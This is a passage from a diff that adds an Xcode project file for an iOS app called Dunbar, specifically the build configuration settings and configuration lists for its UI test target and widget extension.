+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Dunbar.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Dunbar";
+			};
+			name = Release;
+		};
+		56561EA92F3C8C0000E3D86B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				GENERATE_INFOPLIST_FILE = YES;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.handbook.DunbarUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRING_CATALOG_GENERATE_SYMBOLS = NO;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = Dunbar;
+			};
+			name = Debug;
+		};
+		56561EAA2F3C8C0000E3D86B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				GENERATE_INFOPLIST_FILE = YES;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.handbook.DunbarUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRING_CATALOG_GENERATE_SYMBOLS = NO;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = Dunbar;
+			};
+			name = Release;
+		};
+		56A100092F50000100E3D86B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				APPLICATION_EXTENSION_API_ONLY = YES;
+				CODE_SIGN_ENTITLEMENTS = DunbarWidgetExtension/DunbarWidgetExtension.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = DunbarWidgetExtension/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Dunbar Widget";
+				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.handbook.Dunbar.DunbarWidgetExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		56A1000A2F50000100E3D86B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				APPLICATION_EXTENSION_API_ONLY = YES;
+				CODE_SIGN_ENTITLEMENTS = DunbarWidgetExtension/DunbarWidgetExtension.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = Q48HXNW7MB;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = DunbarWidgetExtension/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Dunbar Widget";
+				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.handbook.Dunbar.DunbarWidgetExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		56561E7A2F3C8BFF00E3D86B /* Build configuration list for PBXProject "Dunbar" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				56561EA02F3C8C0000E3D86B /* Debug */,
+				56561EA12F3C8C0000E3D86B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		56561EA22F3C8C0000E3D86B /* Build configuration list for PBXNativeTarget "Dunbar" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				56561EA32F3C8C0000E3D86B /* Debug */,
+				56561EA42F3C8C0000E3D86B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		56561EA52F3C8C0000E3D86B /* Build configuration list for PBXNativeTarget "DunbarTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				56561EA62F3C8C0000E3D86B /* Debug */,
+				56561EA72F3C8C0000E3D86B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		56561EA82F3C8C0000E3D86B /* Build configuration list for PBXNativeTarget "DunbarUITests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				56561EA92F3C8C0000E3D86B /* Debug */,
+				56561EAA2F3C8C0000E3D86B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		56A100082F50000100E3D86B /* Build configuration list for PBXNativeTarget "DunbarWidgetExtension" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				56A100092F50000100E3D86B /* Debug */,
+				56A1000A2F50000100E3D86B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 56561E772F3C8BFF00E3D86B /* Project object */;
+}
